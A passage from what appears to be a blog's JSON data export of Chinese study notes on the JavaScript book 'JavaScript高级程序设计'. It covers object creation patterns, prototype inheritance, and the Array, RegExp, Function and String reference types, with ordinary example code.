title=\"创建对象\"></a>创建对象</h2><h3 id=\"构造函数模式\"><a href=\"#构造函数模式\" class=\"headerlink\" title=\"构造函数模式\"></a>构造函数模式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\">name, age, job</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.job = job;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Nicholas\"</span>, <span class=\"number\">29</span>, <span class=\"string\">\"Software Engineer\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Greg\"</span>, <span class=\"number\">27</span>, <span class=\"string\">\"Doctor\"</span>);</span><br><span class=\"line\">alert(person1.sayName == person2.sayName); <span class=\"comment\">//false</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"原型模式\"><a href=\"#原型模式\" class=\"headerlink\" title=\"原型模式\"></a>原型模式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">Person.prototype.name = <span class=\"string\">\"Nicholas\"</span>;</span><br><span class=\"line\">Person.prototype.age = <span class=\"number\">29</span>;</span><br><span class=\"line\">Person.prototype.job = <span class=\"string\">\"Software Engineer\"</span>;</span><br><span class=\"line\">Person.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> Person();</span><br><span class=\"line\">person1.sayName(); <span class=\"comment\">//\"Nicholas\"</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> Person();</span><br><span class=\"line\">person2.sayName(); <span class=\"comment\">//\"Nicholas\"</span></span><br><span class=\"line\">alert(person1.sayName == person2.sayName); <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p>同时使用 hasOwnProperty()方法和 in 操作符，就可以确定该属性到底是存在于对象中，还是存在于<br>原型中</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasPrototypeProperty</span>(<span class=\"params\">object, name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !object.hasOwnProperty(name) &amp;&amp; name <span class=\"keyword\">in</span> object;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"组合使用构造函数模式和原型模式-推荐模式\"><a href=\"#组合使用构造函数模式和原型模式-推荐模式\" class=\"headerlink\" title=\"组合使用构造函数模式和原型模式(推荐模式)\"></a>组合使用构造函数模式和原型模式(<strong>推荐模式</strong>)</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\">name, age, job</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.job = job;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.friends = [<span class=\"string\">\"Shelby\"</span>, <span class=\"string\">\"Court\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Person.prototype = &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>: Person,</span><br><span class=\"line\">  sayName: function() &#123;</span><br><span class=\"line\">    alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Nicholas\"</span>, <span class=\"number\">29</span>, <span class=\"string\">\"Software Engineer\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Greg\"</span>, <span class=\"number\">27</span>, <span class=\"string\">\"Doctor\"</span>);</span><br><span class=\"line\">person1.friends.push(<span class=\"string\">\"Van\"</span>);</span><br><span class=\"line\">alert(person1.friends); <span class=\"comment\">//\"Shelby,Count,Van\"</span></span><br><span class=\"line\">alert(person2.friends); <span class=\"comment\">//\"Shelby,Count\"</span></span><br><span class=\"line\">alert(person1.friends === person2.friends); <span class=\"comment\">//false</span></span><br><span class=\"line\">alert(person1.sayName === person2.sayName); <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"继承\"><a href=\"#继承\" class=\"headerlink\" title=\"继承\"></a>继承</h2><h3 id=\"原型链\"><a href=\"#原型链\" class=\"headerlink\" title=\"原型链\"></a>原型链</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.property = <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.getSuperValue = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.property;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.subproperty = <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//继承了SuperType</span></span><br><span class=\"line\">SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\">SubType.prototype.getSubValue = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.subproperty;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> instance = <span class=\"keyword\">new</span> SubType();</span><br><span class=\"line\">alert(instance.getSuperValue()); <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2019-01-10-JS高设3版-6/1.jpg\" alt=\"原型链关系图\"></p>\n<h3 id=\"组合继承（最常用）\"><a href=\"#组合继承（最常用）\" class=\"headerlink\" title=\"组合继承（最常用）\"></a>组合继承（<strong>最常用</strong>）</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.colors = [<span class=\"string\">\"red\"</span>, <span class=\"string\">\"blue\"</span>, <span class=\"string\">\"green\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//继承属性</span></span><br><span class=\"line\">  SuperType.call(<span class=\"keyword\">this</span>, name);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//继承方法</span></span><br><span class=\"line\">SubType.prototype = <span class=\"keyword\">new</span> SuperType();</span><br><span class=\"line\">SubType.prototype.constructor = SubType;</span><br><span class=\"line\">SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> instance1 = <span class=\"keyword\">new</span> SubType(<span class=\"string\">\"Nicholas\"</span>, <span class=\"number\">29</span>);</span><br><span class=\"line\">instance1.colors.push(<span class=\"string\">\"black\"</span>);</span><br><span class=\"line\">alert(instance1.colors); <span class=\"comment\">//\"red,blue,green,black\"</span></span><br><span class=\"line\">instance1.sayName(); <span class=\"comment\">//\"Nicholas\";</span></span><br><span class=\"line\">instance1.sayAge(); <span class=\"comment\">//29</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> instance2 = <span class=\"keyword\">new</span> SubType(<span class=\"string\">\"Greg\"</span>, <span class=\"number\">27</span>);</span><br><span class=\"line\">alert(instance2.colors); <span class=\"comment\">//\"red,blue,green\"</span></span><br><span class=\"line\">instance2.sayName(); <span class=\"comment\">//\"Greg\";</span></span><br><span class=\"line\">instance2.sayAge(); <span class=\"comment\">//27</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"原型式继承\"><a href=\"#原型式继承\" class=\"headerlink\" title=\"原型式继承\"></a>原型式继承</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">object</span>(<span class=\"params\">o</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">  F.prototype = o;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> F();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">name: <span class=\"string\">\"Nicholas\"</span>,</span><br><span class=\"line\">friends: [<span class=\"string\">\"Shelby\"</span>, <span class=\"string\">\"Court\"</span>, <span class=\"string\">\"Van\"</span>]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> anotherPerson = object(person);</span><br><span class=\"line\">anotherPerson.name = <span class=\"string\">\"Greg\"</span>;</span><br><span class=\"line\">anotherPerson.friends.push(<span class=\"string\">\"Rob\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> yetAnotherPerson = object(person);</span><br><span class=\"line\">yetAnotherPerson.name = <span class=\"string\">\"Linda\"</span>;</span><br><span class=\"line\">yetAnotherPerson.friends.push(<span class=\"string\">\"Barbie\"</span>);</span><br><span class=\"line\">alert(person.friends); <span class=\"comment\">//\"Shelby,Court,Van,Rob,Barbie\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ES5 Object.create()实现</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">name: <span class=\"string\">\"Nicholas\"</span>,</span><br><span class=\"line\">friends: [<span class=\"string\">\"Shelby\"</span>, <span class=\"string\">\"Court\"</span>, <span class=\"string\">\"Van\"</span>]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> anotherPerson = <span class=\"built_in\">Object</span>.create(person);</span><br><span class=\"line\">anotherPerson.name = <span class=\"string\">\"Greg\"</span>;</span><br><span class=\"line\">anotherPerson.friends.push(<span class=\"string\">\"Rob\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> yetAnotherPerson = <span class=\"built_in\">Object</span>.create(person);</span><br><span class=\"line\">yetAnotherPerson.name = <span class=\"string\">\"Linda\"</span>;</span><br><span class=\"line\">yetAnotherPerson.friends.push(<span class=\"string\">\"Barbie\"</span>);</span><br><span class=\"line\">alert(person.friends); <span class=\"comment\">//\"Shelby,Court,Van,Rob,Barbie\"</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"寄生组合式继承（最理想）\"><a href=\"#寄生组合式继承（最理想）\" class=\"headerlink\" title=\"寄生组合式继承（最理想）\"></a>寄生组合式继承（<strong>最理想</strong>）</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">object</span>(<span class=\"params\">o</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>) </span>&#123;&#125;</span><br><span class=\"line\">  F.prototype = o;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> F();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">inheritPrototype</span>(<span class=\"params\">subType, superType</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> prototype = object(superType.prototype); <span class=\"comment\">//创建对象</span></span><br><span class=\"line\">  prototype.constructor = subType; <span class=\"comment\">//增强对象</span></span><br><span class=\"line\">  subType.prototype = prototype; <span class=\"comment\">//指定对象</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SuperType</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.colors = [<span class=\"string\">\"red\"</span>, <span class=\"string\">\"blue\"</span>, <span class=\"string\">\"green\"</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">SuperType.prototype.sayName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.name);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">SubType</span>(<span class=\"params\">name, age</span>) </span>&#123;</span><br><span class=\"line\">  SuperType.call(<span class=\"keyword\">this</span>, name);</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.age = age;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">inheritPrototype(SubType, SuperType);</span><br><span class=\"line\">SubType.prototype.sayAge = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  alert(<span class=\"keyword\">this</span>.age);</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>"},{"title":"引用类型（《JavaScript高级程序设计》）","date":"2019-01-10T09:46:44.000Z","updated":"2019-01-10T09:46:44.000Z","_content":"\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n引用类型：重点掌握数组，正则，字符串的相关使用。\n<!-- more -->\n\n# 详述\n\n## Array 类型\n\n1.  读取值用方括号`+`基于 0 的数字索引，例如`color[0]`。\n2.  length 属性的使用，例如`colors[colors.length] = \"black\";`。\n3.  检测数组，`Array.isArray(value)`。\n4.  `toString()`方法返回逗号分隔的字符串，想用其他分隔符可以用`join()`方法。\n5.  常用方法：\n\n    - 栈 LIFO（Last-In-First-Out，后进先出）方法`push() + pop()`\n    - 队列 FIFO（First-In-First-Out，先进先出）方法`push() + shift()`，反方向`unshift() + pop()`\n    - 排序方法`reverse()、sort()`\n    - `concat()`方法，不改原数组，返回新数组，参数可以为空、一个、多个，可以为数组或者值。\n    - `slice()`方法，不改原数组，返回新数组，参数可以一个或者两个，即起始位置和结束位置。若只有一个参数，则返回给定起始位置到数组末尾所有项。若两个参数，则返回起始到结束位置间的所有项，不包括结束位置项。\n      语法：\n\n      ```js\n      arr.slice();\n      // [0, end]\n\n      arr.slice(begin);\n      // [begin, end]\n\n      arr.slice(begin, end);\n      // [begin, end)\n      ```\n\n    - `splice()`，实现**删除**、**插入**和**替换**，修改原数组，返回新数组。\n      语法：\n      `js array.splice(start[, deleteCount[, item1[, item2[, ...]]]])`\n    - `indexOf()和lastIndexOf()`，返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1。\n      语法：\n      `js arr.indexOf(searchElement) arr.indexOf(searchElement[, fromIndex]) arr.lastIndexOf(searchElement) arr.lastIndexOf(searchElement[, fromIndex])`\n    - `every()`：对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。\n    - `filter()`：对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组。\n    - `forEach()`：对数组中的每一项运行给定函数。这个方法没有返回值。\n    - `map()`：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。\n    - `some()`：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。\n    - `reduce()和reduceRight()`，这两个方法都会迭代数组的所有项，然后构建一个最终返回的值。其中，reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。\n\n      ```js\n      var values = [1, 2, 3, 4, 5];\n      var sum = values.reduce(function(prev, cur, index, array) {\n        return prev + cur;\n      });\n      alert(sum); //15\n\n      var values = [1, 2, 3, 4, 5];\n      var sum = values.reduceRight(function(prev, cur, index, array) {\n        return prev + cur;\n      });\n      alert(sum); //15\n      ```\n\n## Date 类型\n\n1. `Date.now()`\n2. `Date.parse()`\n3. `date.getTime()`\n\n## RegExp 类型\n\n1. 语法`var expression = / pattern /flags;`。\n2. flags 标志有 3 个：\n   - g：表示全局（global）模式，即模式将被应用于所有字符串，而非在发现第一个匹配项时立即停止；\n   - i：表示不区分大小写（case-insensitive）模式，即在确定匹配项时忽略模式与字符串的大小写；\n   - m：表示多行（multiline）模式，即在到达一行文本末尾时还会继续查找下一行中是否存在与模式匹配的项。\n3. 模式中元字符需要转义，元字符包括：`( [ { \\ ^ $ | ) ? * + .]}`。\n4. 实例属性：\n   - global：布尔值，表示是否设置了 g 标志。\n   - ignoreCase：布尔值，表示是否设置了 i 标志。\n   - lastIndex：整数，表示开始搜索下一个匹配项的字符位置，从 0 算起。\n   - multiline：布尔值，表示是否设置了 m 标志。\n   - source：正则表达式的字符串表示，按照字面量形式而非传入构造函数中的字符串模式返回。\n5. 实例方法：\n   - `exec()`：待完善\n   - `test()`：待完善\n6. 构造函数属性：待完善\n7. 模式的局限性：待完善\n\n## Function 类型\n\n1. 没有重载（深入理解）：函数名是引用（指针），后声明的会覆盖之前的。\n2. 函数声明与函数表达式：解析器处理方式不同，函数声明会在执行其他代码前先读取，函数表达式会在执行到该代码时才读取执行。\n3. 作为值的函数\n\n```js\nfunction createComparisonFunction(propertyName) {\n  return function(object1, object2) {\n    var value1 = object1[propertyName];\n    var value2 = object2[propertyName];\n    if (value1 < value2) {\n      return -1;\n    } else if (value1 > value2) {\n      return 1;\n    } else {\n      return 0;\n    }\n  };\n}\n```\n\n4. 函数内部属性：内部两个特殊的对象：`arguments` 和`this`。\n   - 理解`arguments.callee`\n   - 理解`arguments.callee.caller`\n5. 函数属性和方法：\n   - `length`和`prototype`\n   - 每个函数都包含两个非继承而来的方法：`apply()`和`call()`。\n   - `bind()`\n\n## 基本包装类型\n\n1. Boolean 类型\n2. Number 类型\n   - `num.toFixed([digits])`，参数表示保留几位小数，四舍五入。\n   - `num.toExponential([digits])`，参数表示保留几位小数，四舍五入，e 表示法。\n   - `num.toPrecision([digits])`，参数表示保留所有数字的位数（不包括指数部分），灵活返回 fixed 或者 exponential 格式。\n3. String 类型\n   - `charAt()`和`charCodeAt()`，访问特定字符。\n   - `concat()`，拼接字符串，但是实践中更多用'+'。\n   - `slice(start[, end])`，不改原字符串，返回新字符串。\n   - `substr(start[, length])`，不改原字符串，返回新字符串。\n   - `substring(start[, end])`，不改原字符串，返回新字符串。\n   - `indexOf()`和`lastIndexOf()`，查找子字符串位置。\n   - `trim()`，删除首尾空格，不改原字符串，返回新字符串。\n   - `toLowerCase()`、`toLocaleLowerCase()`、`toUpperCase()`和`toLocaleUpperCase()`，大小写转换，不改原字符串，返回新字符串。\n   - `match()`\n   - `search()`\n   - `replace()`\n   - `split()`\n   - `localeCompare()`，比较该字符串与参数字符串在字母表中的位置，前负，后正，等零。\n   - `fromCharCode()`，静态方法，与实例方法`charCodeAt()`相反操作。\n     ```js\n     alert(String.fromCharCode(104, 101, 108, 108, 111)); //\"hello\"\n     ```\n\n## 单体内置对象\n\n1. Global 对象\n   - `encodeURI()`和`encodeURIComponent()`\n     ```js\n     var uri = \"http://www.wrox.com/illegal value.htm#start\";\n     //\"http://www.wrox.com/illegal%20value.htm#start\"\n     alert(encodeURI(uri));\n     //\"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\"\n     alert(encodeURIComponent(uri));\n     ```\n   - `decodeURI()`和`decodeURIComponent()`\n     ```js\n     var uri = \"http%3A%2F%2Fwww.wrox.com%2Fillegal%20value.htm%23start\";\n     //http%3A%2F%2Fwww.wrox.com%2Fillegal value.htm%23start\n     alert(decodeURI(uri));\n     //http://www.wrox.com/illegal value.htm#start\n     alert(decodeURIComponent(uri));\n     ```\n   - `eval()`，谨慎使用，防止代码注入。\n2. Math 对象\n   - `Math.PI`，π 的值。\n   - `Math.min()`，最小值。\n   - `Math.max()`，最大值。\n   - `Math.ceil()`，向上舍入。\n   - `Math.floor()`，向下舍入。\n   - `Math.round()`，四舍五入。\n   - `Math.random()`，随机数`[0,1)`。\n   - `Math.abs()`，绝对值。\n","source":"_posts/2019/01/2019-01-10-JS高设3版-5.md","raw":"---\ntitle: 引用类型（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记\ncategories:\n  - 前端\ndate: 2019-01-10 17:46:44\nupdated: 2019-01-10 17:46:44\n---\n\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n引用类型：重点掌握数组，正则，字符串的相关使用。\n<!-- more -->\n\n# 详述\n\n## Array 类型\n\n1.  读取值用方括号`+`基于 0 的数字索引，例如`color[0]`。\n2.  length 属性的使用，例如`colors[colors.length] = \"black\";`。\n3.  检测数组，`Array.isArray(value)`。\n4.  `toString()`方法返回逗号分隔的字符串，想用其他分隔符可以用`join()`方法。\n5.  常用方法：\n\n    - 栈 LIFO（Last-In-First-Out，后进先出）方法`push() + pop()`\n    - 队列 FIFO（First-In-First-Out，先进先出）方法`push() + shift()`，反方向`unshift() + pop()`\n    - 排序方法`reverse()、sort()`\n    - `concat()`方法，不改原数组，返回新数组，参数可以为空、一个、多个，可以为数组或者值。\n    - `slice()`方法，不改原数组，返回新数组，参数可以一个或者两个，即起始位置和结束位置。若只有一个参数，则返回给定起始位置到数组末尾所有项。若两个参数，则返回起始到结束位置间的所有项，不包括结束位置项。\n      语法：\n\n      ```js\n      arr.slice();\n      // [0, end]\n\n      arr.slice(begin);\n      // [begin, end]\n\n      arr.slice(begin, end);\n      // [begin, end)\n      ```\n\n    - `splice()`，实现**删除**、**插入**和**替换**，修改原数组，返回新数组。\n      语法：\n      `js array.splice(start[, deleteCount[, item1[, item2[, ...]]]])`\n    - `indexOf()和lastIndexOf()`，返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1。\n      语法：\n      `js arr.indexOf(searchElement) arr.indexOf(searchElement[, fromIndex]) arr.lastIndexOf(searchElement) arr.lastIndexOf(searchElement[, fromIndex])`\n    - `every()`：对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。\n    - `filter()`：对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组。\n    - `forEach()`：对数组中的每一项运行给定函数。这个方法没有返回值。\n    - `map()`：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。\n    - `some()`：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。\n    - `reduce()和reduceRight()`，这两个方法都会迭代数组的所有项，然后构建一个最终返回的值。其中，reduce()方法从数组的第一项开始，逐个遍历到最后。而 reduceRight()则从数组的最后一项开始，向前遍历到第一项。\n\n      ```js\n      var values = [1, 2, 3, 4, 5];\n      var sum = values.reduce(function(prev, cur, index, array) {\n        return prev + cur;\n      });\n      alert(sum); //15\n\n      var values = [1, 2, 3, 4, 5];\n      var sum = values.reduceRight(function(prev, cur, index, array) {\n        return prev + cur;\n      });\n      alert(sum); //15\n      ```\n\n## Date 类型\n\n1. `Date.now()`\n2. `Date.parse()`\n3. `date.getTime()`\n\n## RegExp 类型\n\n1. 语法`var expression = / pattern /flags;`。\n2. flags 标志有 3 个：\n   - g：表示全局（global）模式，即模式将被应用于所有字符串，而非在发现第一个匹配项时立即停止；\n   - i：表示不区分大小写（case-insensitive）模式，即在确定匹配项时忽略模式与字符串的大小写；\n   - m：表示多行（multiline）模式，即在到达一行文本末尾时还会继续查找下一行中是否存在与模式匹配的项。\n3. 模式中元字符需要转义，元字符包括：`( [ { \\ ^ $ | ) ? * + .]}`。\n4. 实例属性：\n   - global：布尔值，表示是否设置了 g 标志。\n   - 